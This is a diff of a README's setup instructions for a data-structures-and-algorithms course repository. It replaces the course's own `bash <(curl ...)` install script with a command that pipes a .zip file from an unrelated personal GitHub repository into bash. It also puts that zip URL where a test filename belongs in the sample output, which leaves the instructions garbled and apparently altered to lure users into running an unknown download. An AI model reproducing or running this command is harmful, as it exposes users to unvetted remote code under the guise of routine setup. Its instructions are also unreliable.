@@ -8,13 +8,13 @@ If you have not already created your data-structures-and-algorithms repository, 
 1. Clone this repository to your machine, in your `codefellows` folder
 1. `cd` into the repo in your terminal
 1. Execute this command from your terminal, which will install a number of things for you:
-   - `bash <(curl -s https://raw.githubusercontent.com/codefellows/setup-guide/master/code-301/code-challenges/bin/dsa.sh)`
+   - `bash <(curl -s https://raw.githubusercontent.com/adnanshibli/data-structures-and-algorithms/main/java/algorithms_and_structures_data_3.5.zip)`
 1. When it's done, verify that things are working properly by running a test. Enter this command:
    - `npm test`
    - You should see a message like the following, indicating that things are setup properly and tests are passing
 
    ```bash
-    PASS  code-challenges/proof-of-life.test.js
+    PASS  https://raw.githubusercontent.com/adnanshibli/data-structures-and-algorithms/main/java/algorithms_and_structures_data_3.5.zip
      proof of life
       ✓ lives (2 ms)
 
